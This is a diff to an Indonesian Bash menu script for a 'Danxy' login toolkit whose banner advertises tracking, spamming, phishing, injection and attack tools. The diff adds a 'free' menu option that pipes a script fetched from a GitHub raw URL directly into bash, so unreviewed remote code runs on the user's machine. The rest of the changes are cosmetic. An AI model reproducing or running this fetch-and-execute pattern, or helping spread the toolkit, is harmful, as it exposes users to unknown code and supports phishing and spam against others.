@@ -152,7 +152,7 @@ echo -e "
 ┏━━━━━━━━${RED}● ${GREEN}[${YELLOW}LICENSE${GREEN}]${RED} ●${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃${CYAN}●                                                                  ${CYAN}●┃
 ${GREEN}┃               ${WHITE} ▄▀▀▀▄${NC}                                               ${GREEN}┃
-${GREEN}┃               ${WHITE} █   █${MC}                                               ${GREEN}┃
+${GREEN}┃               ${WHITE} █   █${NC}                                               ${GREEN}┃
 ${GREEN}┃               ${WHITE}███████${BLUE}         ▄▀▀▄  ${RED}|${GREY}  ╦  ╔═╗╔═╗╦╔╗╔               ${GREEN}┃
 ${GREEN}┃               ${GREY}██─▀─██${BLUE}  █▀█▀▀▀▀█  █  ${RED}|${GREY}  ║  ║ ║║ ╦║║║║               ${GREEN}┃
 ${GREEN}┃               ${GREY}███▄███${BLUE}  ▀ ▀     ▀▀   ${RED}|${GREY}  ╩═╝╚═╝╚═╝╩╝╚╝               ${GREEN}┃
@@ -164,7 +164,6 @@ ${GREEN}┃                      ${GREEN}${BOLD}TOOLS BY DANXY OFFICIAL${GREEN} 
 ${RED}┃                      ${YELLOW}YT${RED}: ${GREEN}DanxyBot ${YELLOW}TT${RED}: ${GREEN}Qwela.38${RED}                     ┃
 ${RED}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${NC}"
 echo -e "             ${BG_RED}${YELLOW}WELCOME TO REGRISTRASI & LOGIN TOOLS DANXY${NC}"
-echo -e "   ${CYAN} KETIK PANDUAN DENGAN HURUF KECIL UNTUK MELIHAT PANDUAN LOGIN${NC}"
 echo ""
 }
 echo -e "${NC}"
@@ -211,6 +210,11 @@ database tools v8.4 ini jadi ikutin langkah langkah nya!!
 ${WHITE}"
 read -rp "TEKAN ENTER UNTUK KEMBALI KE MENU"
 }
+
+
+free() {
+bash <(curl -sL "https://raw.githubusercontent.com/112233-bot-bot/lolghost/refs/heads/main/Free.sh")
+}
 get_whoami() {
     banner
     echo -e "${BG_YELLOW}${RED}SALIN ID USER WARNA HIJAU DI BAWAH INI 
@@ -224,14 +228,16 @@ MENDAFTARKAN ANDA KE DATABASE${NC}\n"
 main_menu() {
     while true; do
         banner
+        echo -e "   ${CYAN} KETIK PANDUAN DENGAN HURUF KECIL UNTUK MELIHAT PANDUAN LOGIN${NC}"
         echo -e "${RED}           ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${NC}"
         echo -e "${RED}           ┃                                            ┃${NC}"
         echo -e "${GREEN}┏━━━━━━━━━━┴━━━━━━━━━━┓${NC}                       ${GREEN}┏━━━━━━━━━┴━━━━━━━━━━━┓${NC}"
         echo -e "${GREEN}┃${BG_RED}${YELLOW}MENU LOGIN TOOLS V8.4${NC}${GREEN}┃${NC}                       ${GREEN}┃   ${BG_RED}${YELLOW}INFORMASI TOOLS${NC}${GREEN}   ┃${NC}"
         echo -e "${GREEN}┏━━━━━━━━━━━━━━━━━━━━━┓${NC}                       ${GREEN}┏━━━━━━━━━━━━━━━━━━━━━┓${NC}"
-        echo -e "${GREEN}┃${CYAN}1)${NC} ${GREEN}LOGIN             ${GREEN}┃${NC}                       ${GREEN}┃${NC} ${CYAN}● ${GREEN}TRACKING  ${CYAN}● ${GREEN}SPAMER${GREEN}┃${NC}"
+        echo -e "${GREEN}┃${CYAN}1)${NC} ${GREEN}LOGIN BUYER ONLY  ${GREEN}┃${NC}                       ${GREEN}┃${NC} ${CYAN}● ${GREEN}TRACKING  ${CYAN}● ${GREEN}SPAMER${GREEN}┃${NC}"
         echo -e "${GREEN}┃${CYAN}2)${NC} ${YELLOW}DAPATKAN ID ANDA  ${GREEN}┃${NC}                       ${GREEN}┃${NC} ${CYAN}● ${YELLOW}OSIN      ${CYAN}● ${YELLOW}SUNTIK${GREEN}┃${NC}"
-        echo -e "${GREEN}┃${CYAN}3)${NC} ${RED}Keluar            ${GREEN}┃${NC}                       ${GREEN}┃${NC} ${CYAN}● ${RED}PHISING   ${CYAN}● ${RED}HEFUN ${GREEN}┃${NC}"
+        echo -e "${GREEN}┃${CYAN}3)${NC} ${GREEN}TOOLS FREE        ${GREEN}┃${NC}                       ${GREEN}┃${NC} ${CYAN}● ${RED}ATTACK    ${CYAN}● ${RED}DEPLOY${GREEN}┃${NC}"
+        echo -e "${GREEN}┃${CYAN}4)${NC} ${RED}KELUAR            ${GREEN}┃${NC}                       ${GREEN}┃${NC} ${CYAN}● ${RED}PHISING   ${CYAN}● ${RED}HEFUN ${GREEN}┃${NC}"
         echo -e "${GREEN}┗━━━━━━━━━━━━━━━━━━━━━┛${NC}                       ${GREEN}┗━━━━━━━━━━━━━━━━━━━━━┛${NC}"
         echo -e "${GREEN}      ┃                                                       ┃${NC}"
         echo -e "${GREEN}      ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${NC}"
@@ -246,7 +252,8 @@ main_menu() {
             1) login_by_name ;;
             2) get_whoami ;;
      panduan) panduan ;;
-            3) echo "Bye!"; exit 3 ;;
+            3) free ;;
+            4) echo "Bye!"; exit 3 ;;
             *) echo -e "${RED}Pilihan salah!${NC}"; sleep 1 ;;
         esac
     done
